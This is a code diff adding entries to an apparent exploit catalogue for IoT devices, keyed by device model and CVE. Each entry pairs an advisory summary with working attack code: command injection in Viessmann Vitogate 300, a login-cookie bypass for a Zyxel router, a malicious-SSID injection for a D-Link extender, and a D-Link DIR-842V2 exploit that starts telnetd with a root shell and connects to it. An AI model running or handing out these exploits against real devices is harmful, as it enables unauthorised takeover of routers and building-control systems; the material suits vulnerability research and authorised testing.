@@ -3458,3 +3458,226 @@ a='`telnetd -p 8082 -l /bin/sh`' ; curl http://192.168.0.1/HNAP1 -H 'SOAPAction:
 """ 
      ]
 }
+
+model_exp_dic["Vitogate_300"] = {
+    "CVE-2023-45852":["In Vitogate 300 2.1.3.0, /cgi-bin/vitogate.cgi allows an unauthenticated attacker to bypass authentication and execute arbitrary commands via shell metacharacters in the ipaddr params JSON data for the put method.\n['https://github.com/Push3AX/vul/blob/main/viessmann/Vitogate300_RCE.md']",
+                      """
+import requests
+import sys
+
+if len(sys.argv) != 4:
+    print("python script.py [IP] [PORT] [CMD]")
+    sys.exit(1)
+
+ip = sys.argv[1]
+port = sys.argv[2]
+cmd = sys.argv[3]
+url = f"http://{ip}:{port}/cgi-bin/vitogate.cgi"
+
+headers = {
+    "Accept": "*/*",
+    "X-Requested-With": "XMLHttpRequest",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+    "Content-Type": "application/json",
+    "Origin": f"http://{ip}:{port}",
+    "Referer": f"http://{ip}:{port}/",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept-Language": "zh-CN,zh;q=0.9",
+    "Cookie": "langCookie=en",
+    "Connection": "close"
+}
+data = {
+    "method": "put",
+    "form": "form-4-8",
+    "session": "",
+    "params": {
+        "ipaddr": f"1;{cmd};"
+    }
+}
+
+response = requests.post(url, headers=headers, json=data)
+print(response.status_code)
+print(response.text)
+
+                      """]
+}
+
+model_exp_dic["Zyxel-NBG2105"] = {"CVE-2021-3297":["On Zyxel NBG2105 V1.00(AAGU.2)C0 devices, setting the login cookie to 1 provides administrator access.\n['https://github.com/nieldk/vulnerabilities/blob/main/zyxel%20nbg2105/Admin%20bypass'\n'https://www.zyxel.com/us/en/support/security_advisories.shtml']",
+"""
+import requests
+import sys
+from requests.packages.urllib3.exceptions 
+import InsecureRequestWarning
+def poc(url):
+    exp = url + "/login_ok.htm"
+    header = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
+        "cookie":"login=1",
+    }
+    try:
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+        response = requests.get(url=exp, headers=header, verify=False,timeout=10)
+        #print(response.text)
+        if response.status_code == 200 and "GMT" in response.text:
+            print("ok")
+            print(response.text)
+        else:
+            print("no vuln")
+    except Exception as e:
+        print(exp + "request error")
+def main():
+    url = str(input("url:"))
+    poc(url)
+if __name__ == "__main__":
+    main()
+"""
+]}
+
+model_exp_dic["D-Link_DAP-X1860"] = {"CVE-2023-45208":["The Wi-Fi network scanning functionality of the D-Link DAP-X1860 range extender is susceptible to remote command injection. Attackers who create a Wi-Fi network with a crafted SSID in range of the extender can run shell commands during the setup process or when using the network scan function of the range extender.\n['https://www.redteam-pentesting.de/en/advisories/rt-sa-2023-006/-d-link-dap-x1860-remote-command-injection']","""
+# This vulnerability seems to need to be actively triggered and needs to create an ap, so that the extender can actively connect and generate command injection in the ssid name of the ap.
+create_ap -n wlan0 "Test' && uname -a &&" randompw98zwrd8g283d3                                                                                                                                                                                                                                                                                                                                                                                                                      
+"""]}
+
+
+
+model_exp_dic["DIR-842V2"] = {
+    "CVE-2023-33782":
+    ["D-Link DIR-842V2 v1.0.3 was discovered to contain a command injection vulnerability via the iperf3 diagnostics function.\n'https://github.com/s0tr/CVE-2023-33782'\n'https://www.dlink.com/en/security-bulletin/'",
+"""
+import logging
+import websockets
+import argparse
+import sys
+import json
+import requests
+import asyncio
+import warnings
+
+warnings.filterwarnings(action="ignore")
+import telnetlib
+
+logging.basicConfig(stream=sys.stdout, level=logging.DEBUG, format="%(message)s")
+logging.getLogger("websockets.client").setLevel(logging.ERROR)
+logging.getLogger("asyncio").setLevel(logging.ERROR)
+logging.getLogger("urllib3.connectionpool").setLevel(logging.ERROR)
+
+logger = logging.getLogger(__file__)
+
+
+class PocIperf3:
+    def __init__(self, host, port, username, password):
+        self.__host = host
+        self.__port = port
+        self.__username = username
+        self.__password = password
+        self.__session = None
+
+    def __setup_session(self):
+        headers = {
+            "Host": self.__host,
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate",
+            "Content-Type": "application/json;charset=utf-8",
+            "Origin": "http://{}".format(self.__host),
+            "Connection": "keep-alive",
+        }
+        session = requests.session()
+        session.cookies.set("DMSD-Access-Token", "INVALID")
+        session.cookies.set("device_mode", "router")
+        session.headers.update(headers)
+        return session
+
+    def __login(self, username, password):
+        login_data = {
+            "login": username,
+            "password": password,
+            "staysigned": False
+        }
+        logger.info("[?] Attempting to login...")
+        self.__session = self.__setup_session()
+
+        response = self.__session.post("http://{}:{}/login?".format(self.__host, self.__port), json.dumps(login_data))
+        if response.status_code != 200:
+            raise Exception("[-] Failed to authenticate")
+
+        response_body = json.loads(response.content)
+        if "error" in response_body.keys():
+            raise Exception(
+                "[-] We got an error message ERR_CODE = {}, ERR_MESSAGE = {}".format(response_body["error"]["code"],
+                                                                                     response_body["error"]["message"]))
+
+        access_token = response_body["result"]["AccessToken"]
+        self.__session.cookies.set("DMSD-Access-Token", access_token)
+
+        logger.info("[+] Logged in successfully...")
+        return access_token, self.__session.cookies.get("device-session-id")
+
+    async def __send_websockets_payload(self, access_token, device_session_id):
+        payload = ";telnetd -l /bin/sh #"
+        sysutils_json = {
+            "method": "iperf3",
+            "params": {
+                "host": "192.168.0.1",
+                "port": "4444",
+                "bitrate": payload,
+            }
+        }
+        sysutils_message = "sysutils:{}".format(json.dumps(sysutils_json))
+
+        async with websockets.connect("ws://{}:{}/websocket".format(self.__host, self.__port), extra_headers={
+            "Cookie": "DMSD-Access-Token={}; device-session-id={}".format(access_token,
+                                                                          device_session_id)}) as websocket:
+            logger.info("[+] Connected to socket...")
+
+            logger.info("[+] Sending init message...")
+            await websocket.send("init 3202273469")
+
+            received_message = await websocket.recv()
+            logger.info("[?] Received [{}] from server...".format(received_message[:-1]))
+
+            logger.info("[+] Sending ping message...")
+            await websocket.send("ping")
+
+            received_message = await websocket.recv()
+            logger.info("[?] Received [{}] from server...".format(received_message[:-1]))
+
+            logger.info("[+] Sending payload [{}]".format(sysutils_message))
+            await websocket.send(sysutils_message)
+
+            received_message = await websocket.recv()
+            logger.info("[?] Received [{}] from server...".format(received_message))
+
+    def exploit(self):
+        access_token, device_session_id = self.__login(self.__username, self.__password)
+        asyncio.new_event_loop().run_until_complete(self.__send_websockets_payload(access_token, device_session_id))
+
+        logger.info("[+] Enjoy your shell ^^...")
+        telnet = telnetlib.Telnet(self.__host)
+        telnet.interact()
+
+
+def get_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--host", required=True, help="The IP of the target")
+    parser.add_argument("--port", required=False, help="The port of the http web service, usually 80", default=80)
+
+    # This is an authenticated vulnerability, the script needs username and password for logging in
+    parser.add_argument("--username", required=False, help="The username of the admin account from the router",
+                        default="admin")
+    parser.add_argument("--password", required=True, help="The password of the admin account from the router")
+    return parser.parse_args()
+
+
+if __name__ == "__main__":
+    args = get_args()
+
+    try:
+        poc = PocIperf3(args.host, args.port, args.username, args.password)
+        poc.exploit()
+    except Exception as ex:
+        logger.error(str(ex))
+"""
+     ]
+}
